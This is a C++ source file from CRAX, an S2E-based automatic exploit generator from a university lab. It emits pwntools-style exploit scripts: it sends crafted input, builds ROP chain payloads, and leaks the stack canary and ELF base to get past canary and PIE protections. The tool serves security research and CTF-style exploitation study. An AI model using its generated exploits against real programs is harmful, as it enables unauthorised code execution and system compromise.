// Copyright 2021-2022 Software Quality Laboratory, NYCU.
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

#include <s2e/Plugins/CRAX/CRAX.h>
#include <s2e/Plugins/CRAX/Expr/BinaryExprEvaluator.h>
#include <s2e/Plugins/CRAX/InputStream.h>

#include "LeakBasedCoreGenerator.h"

#include <variant>

namespace s2e::plugins::crax {

using InputStateInfo = IOStates::InputStateInfo;
using OutputStateInfo = IOStates::OutputStateInfo;
using SleepStateInfo = IOStates::SleepStateInfo;


// Since InputStateInfo, OutputStateInfo and SleepStateInfo hold
// completely unrelated data, they are declared as std::variant
// instead of sharing a common base type. As a result we'll use
// std::visit() to visit and handle them separately.

struct IOStateInfoVisitor {
    // StateInfo handlers
    void operator()(const InputStateInfo &stateInfo);
    void operator()(const OutputStateInfo &stateInfo);
    void operator()(const SleepStateInfo &stateInfo);

    bool shouldSkipInputState() const;
    void handleStage1(const InputStateInfo &stateInfo);

    // Extra parameters
    Exploit &exploit;
    const ELF &elf;
    const std::vector<RopSubchain> &ropChain;
    InputStream &inputStream;
    const IOStates::State &modState;
    const size_t i;  // the index of `stateInfo` in `modState.stateInfoList`
};


void IOStateInfoVisitor::operator()(const InputStateInfo &stateInfo) {
    // This bridges compatibility between IOStates and DynamicRop modules.
    // DynamicRop starts after the target program's RIP becomes symbolic
    // for the first time, and then the DynamicRop module adds constraints
    // to that execution state, making the target program perform ROP in S2E.
    // 
    // During dynamic ROP, the target program may trigger extra I/O states
    // that shouldn't occur during normal program execution. A good example is
    // that we make make it return to somewhere in main() again after RIP
    // has become symbolic for the first time.
    //
    // If all required information have already been leaked, then we should
    // just ignore these extra I/O states (especially the input states).
    if (shouldSkipInputState()) {
        exploit.writeline(format("# input state (offset = %d), skipped", stateInfo.offset));
        static_cast<void>(inputStream.skip(stateInfo.offset));
        return;
    }

    exploit.writeline(format("# input state (offset = %d)", stateInfo.offset));

    if (i != modState.lastInputStateInfoIdx) {
        llvm::ArrayRef<uint8_t> bytes = inputStream.read(stateInfo.offset);
        std::string byteString = toByteString(bytes.begin(), bytes.end());

        exploit.writeline(format("proc.send(%s)", byteString.c_str()));
        return;
    }

    exploit.writeline("# input state (rop chain begin)");

    handleStage1(stateInfo);

    for (size_t j = 1; j < ropChain.size(); j++) {
        for (const ref<Expr> &e : ropChain[j]) {
            exploit.appendRopPayload(evaluate<std::string>(e));
        }
        exploit.flushRopPayload();
    }
}

bool IOStateInfoVisitor::shouldSkipInputState() const {
    // This shouldn't happen, but...
    assert(-1 != modState.lastInputStateInfoIdxBeforeFirstSymbolicRip);

    return i != modState.lastInputStateInfoIdx &&
           i >= modState.lastInputStateInfoIdxBeforeFirstSymbolicRip;
}

void IOStateInfoVisitor::handleStage1(const InputStateInfo &stateInfo) {
    std::string s;

    // Let's deal with the simplest case first (no canary and no PIE).
    if (!elf.checksec.hasCanary && !elf.checksec.hasPIE) {
        assert(ropChain[0].size() == 1 &&
               "ropChain[0] must only contain a ByteVectorExpr");

        llvm::ArrayRef<uint8_t> bytes = inputStream.read(stateInfo.offset);
        s += evaluate<std::string>(ByteVectorExpr::create(bytes));
    } else {
        // If either canary or PIE is enabled, stage1 needs to be solved
        // on the fly at exploitation time.
        s += format("solve_stage1(canary, elf_base, '%s')", modState.toString().c_str());
        s += format("[%d:", inputStream.getNrBytesRead());

        if (inputStream.getNrBytesSkipped()) {
            s += std::to_string(inputStream.getNrBytesConsumed());
        }
        s += ']';
    }

    exploit.appendRopPayload(s);
    exploit.flushRopPayload();
}

void IOStateInfoVisitor::operator()(const OutputStateInfo &stateInfo) {
    exploit.writeline("# output state");

    // This output state cannot leak anything.
    if (!stateInfo.isInteresting) {
        exploit.writeline("proc.recvrepeat(0.1)");
        return;
    }

    exploit.writeline("# leaking: " + IOStates::toString(stateInfo.leakType));

    if (stateInfo.leakType == IOStates::LeakType::CANARY) {
        exploit.writelines({
            format("proc.recv(%d)", stateInfo.bufIndex),
            "canary = u64(b'\\x00' + proc.recv(7))",
            "log.info('leaked canary: {}'.format(hex(canary)))",
        });
    } else {
        exploit.writelines({
            format("proc.recv(%d)", stateInfo.bufIndex),
            "elf_leak = u64(proc.recv(6).ljust(8, b'\\x00'))",
            format("elf_base = elf_leak - 0x%x", stateInfo.baseOffset),
            "log.info('leaked elf_base: {}'.format(hex(elf_base)))",
        });
    }
}

void IOStateInfoVisitor::operator()(const SleepStateInfo &stateInfo) {
    exploit.writeline("# sleep state");
    exploit.writeline(format("sleep(%d)", stateInfo.sec));
}


void LeakBasedCoreGenerator::generateMainFunction(S2EExecutionState *state,
                                                  std::vector<RopSubchain> ropChain,
                                                  std::vector<uint8_t> stage1) {
    Exploit &exploit = g_crax->getExploit();
    InputStream inputStream(stage1);

    auto iostates = dynamic_cast<IOStates *>(CRAX::getModule("IOStates"));
    assert(iostates);

    auto modState = g_crax->getModuleState(state, iostates);
    assert(modState);

    for (size_t i = 0; i < modState->stateInfoList.size(); i++) {
        exploit.writeline();

        std::visit(IOStateInfoVisitor{exploit, exploit.getElf(), ropChain, inputStream, *modState, i},
                   modState->stateInfoList[i]);
    }
}

}  // namespace s2e::plugins::crax